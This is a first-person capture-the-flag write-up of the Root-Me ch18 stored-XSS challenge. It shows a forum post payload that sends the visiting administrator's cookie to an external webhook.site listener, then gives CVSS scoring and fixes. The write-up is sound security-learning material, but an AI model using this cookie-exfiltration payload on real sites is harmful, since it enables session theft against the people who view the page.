---
icon: user-hoodie
---

# Root-Me Web-Client ch18 — Stored XSS: Admin Cookie Exfiltration

## Overview

The target is a forum called Forum v.0.001 that accepts Title and Message as parameters and displays posted messages back on the page. The main focus is the discovery and exploitation of a **Stored Cross-Site Scripting (XSS)** attack that allows the exfiltration of administrator cookies

**Vulnerability**: Untrusted user input without proper sanitization and encoding can be interpreted as active content by the browser.

**Impact:** Malicious actors can inject scripts that get executed by viewers who view the affected page

## Environment

* Kali Linux on Oracle VirtualBox
* Burp Suite
* Target: `http://challenge01.root-me.org/web-client/ch18/`

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2FLqSTaUQGFwflDAHPcknc%2Finitial_1.png?alt=media&#x26;token=e3aafa2d-a6b0-42d3-9191-ff6eaf8b72e7" alt="" width="375"><figcaption><p>Figure 1a - Initial RootMe Website</p></figcaption></figure>

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2FWBTQeMQbiObwLKpJC1Dm%2Fsetup_1.png?alt=media&#x26;token=a1d35431-e27e-4a0d-b773-90a257acf4b0" alt=""><figcaption><p>Figure 1b - RootMe and Burp Suite setup</p></figcaption></figure>

## Discovery

The application's forum structure closely resembled the DVWA stored-XSS exercise, so stored XSS was an early hypothesis.

First, a Hello World alert was made to test out the hypothesis.

```html
<script>alert("Hello World")</script>
```

The alert fired when the post rendered, confirming the application **stores and returns input without output encoding**, and that injected scripts execute.

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2FJfbBW1fOKonK9egILgiz%2Fxsstest_2.png?alt=media&#x26;token=d290b9a0-0397-4d3f-b35a-d424fd896400" alt=""><figcaption><p>Figure 2a - Hello World payload</p></figcaption></figure>

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2Fzpke3UmuJoS1WanazdbP%2Fxssresult_3.png?alt=media&#x26;token=0f98ab7b-6413-4500-81ba-88460fc476c2" alt=""><figcaption><p>Figure 2b - Hello World Alert</p></figcaption></figure>

## Establishing the attack goal

With execution confirmed, I tested whether cookie theft was viable by injecting `document.cookie`. It returned blank, which revealed that my session had no readable cookie. That reframed the problem: the cookie worth stealing belongs to whoever's browser _executes_ the script, not mine. I still needed to find out how the admin would visit the vulnerable page.

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2F1Ixz4PZKKXnMahmwYlGp%2Fcookie_3.png?alt=media&#x26;token=ccaae2fc-9dee-4205-8e08-c26ac5c3c499" alt=""><figcaption><p>Figure 3 - alert(document.cookie) payload</p></figcaption></figure>

## Ruling out an alternative path

The page displayed a `Status: visitor` label, so I checked in Burp whether privilege was tracked in a client-controllable value. Only `titre` and `message` were sent to the server. No status parameter indicating the label is server-rendered and not forgeable. This ruled out a privilege-escalation route.

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2FQ2nEoqnzuXaAn8GBhE39%2Fstatuscheck_4.png?alt=media&#x26;token=834f1cf2-4f27-47f9-9c95-689c7e9f8d0d" alt=""><figcaption><p>Figure 4 - POST Request</p></figcaption></figure>

I also inspected the server's response headers and found **no `Content-Security-Policy`** — meaning inline scripts and outbound requests to external origins are unrestricted, a precondition for exfiltration to succeed.

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2F7B4FloRYhU8oEzLU6Yho%2Fresponseheader_5.png?alt=media&#x26;token=61ebc4be-9143-4f10-a206-16820bc5ad9e" alt=""><figcaption><p>Figure 5 - Server Response</p></figcaption></figure>

## Finding the victim

Reviewing the page source, one system-generated post stood out: _"Message read / Your messages have been read."_  So an automated process might be periodically reading stored posts.

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2FtFc5k0sMxUrWtKiK6gSp%2Freadmessage_5.png?alt=media&#x26;token=81d29974-38b1-44fe-b267-0f8d44193805" alt=""><figcaption><p>Figure 6 - Message has been read</p></figcaption></figure>

## Exploitation

I created a listener on webhook.site and crafted a payload that, on execution, reads the current cookie and sends it out-of-band as a query parameter:

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2FCsULQm8qB43NJ1zworIg%2Fpayload_5.png?alt=media&#x26;token=fa627032-c9e3-4852-922f-80a2980a9de4" alt=""><figcaption><p>Figure 7a - Constructing the payload</p></figcaption></figure>

```html
<script>new Image().src='https://webhook.site/af65c00b-462e-4a3f-b187-8956fd416856/?c='+encodeURIComponent(document.cookie)</script>
```

An `Image` object is created that sends a request to an attacker-controlled webhook instead of retrieving a legitimate image. When the page is rendered and the injected JavaScript executes in the administrator's browser, the browser issues an HTTP GET request to the webhook URL, sending the browser-accessible cookies as the `c` query parameter.

<figure><img src="https://1663867449-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FQijVmevsxGIaeCOIXb92%2Fuploads%2FdEpEpqnX4QxWTadkSsmw%2Fcookie_6.png?alt=media&#x26;token=849206ce-a2c4-40c7-bdb5-865f8adf6e72" alt=""><figcaption><p>Figure 7b - Getting the cookie from webhook.site dashboard</p></figcaption></figure>

## Risk Assessment — CVSS 3.1 Scoring

{% hint style="info" %}
This vulnerability was scored as if it were in a production web application. Not a constrained Root-Me lab exercise.
{% endhint %}

**CVSS 3.1 Base Score:** <mark style="color:$warning;">**4.7 (Medium)**</mark>

`AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N`

<table><thead><tr><th width="145">Metric</th><th width="125">Value</th><th>Description</th></tr></thead><tbody><tr><td><strong>Attack Vector (AV)</strong></td><td>Network (N)</td><td>The forum is reachable across the network.</td></tr><tr><td><strong>Attack Complexity (AC)</strong></td><td>Low (L)</td><td>No conditions need to be met by the attacker before preparing the attack</td></tr><tr><td><strong>Privileges Required (PR)</strong></td><td>None (N)</td><td>Burp inspection of the POST request showed only <code>titre</code> and <code>message</code> are submitted.</td></tr><tr><td><strong>User Interaction (UI)</strong></td><td>Required (R)</td><td>An administrator or another privileged user must "read" the affected web page for the payload to execute.</td></tr><tr><td><strong>Scope (S)</strong></td><td>Changed (C)</td><td>The vulnerable component, which is the web application forum, sits under a different scope, where the impacted component is the victim's browser.</td></tr><tr><td><strong>Confidentiality (C)</strong></td><td>Low (L)</td><td>A malicious actor can steal another user's session cookie; in the worst case, an administrator's. Whether that cookie can be used to authenticate as the victim, and what an authenticated session of that kind can access, was not established during this assessment.</td></tr><tr><td><strong>Integrity (I)</strong></td><td>None (N)</td><td>The only admin behavior actually observed is the "Message read" indicator. No edit, delete, or configuration action was demonstrated or attempted with the captured session.</td></tr><tr><td><strong>Availability (A)</strong></td><td>None (N)</td><td>Nothing in the exploit payload causes or implies service disruption. The attack path is read/exfiltrate only.</td></tr></tbody></table>

### Temporal Score

**CVSS 3.1 Temporal Score:&#x20;**<mark style="color:$warning;">**4.7 (Medium)**</mark>

`E:H/RL:U/RC:C`

<table><thead><tr><th width="123">Metric</th><th width="149">Value</th><th>Justification</th></tr></thead><tbody><tr><td><strong>Exploit Code Maturity (E)</strong></td><td>High (H)</td><td>No specialized exploit development is required. The payload is a hand-crafted <code>&#x3C;script></code> tag and a <code>new Image().src</code> for cookie exfiltration to an external endpoint.</td></tr><tr><td><strong>Remediation Level (RL)</strong></td><td>Unavailable (U)</td><td>No official patch, temporary fix, or documented workaround is available for the affected application.</td></tr><tr><td><strong>Report Confidence (RC)</strong></td><td>Confirmed (C)</td><td>The write-up is a first-person, fully reproduced confirmation of the vulnerability.</td></tr></tbody></table>

## Mitigation

### **Issue**

The website stores whatever users type and shows it to other visitors without changing it, so if someone types `<script>...</script>`, the victim's browser treats it as real code and runs it.

### **Fix**

HTML-encode messages when displaying them (turning `<` into `&lt;`, etc.) so the browser shows the text literally instead of executing it.

Using `htmlspecialchars($msg, ENT_QUOTES, 'UTF-8')` in PHP, or an allowlist sanitizer like `DOMPurify` if you need to permit some formatting.&#x20;

As backups, add a Content-Security-Policy header and set `HttpOnly` on cookies so they can't be stolen via `document.cookie.`
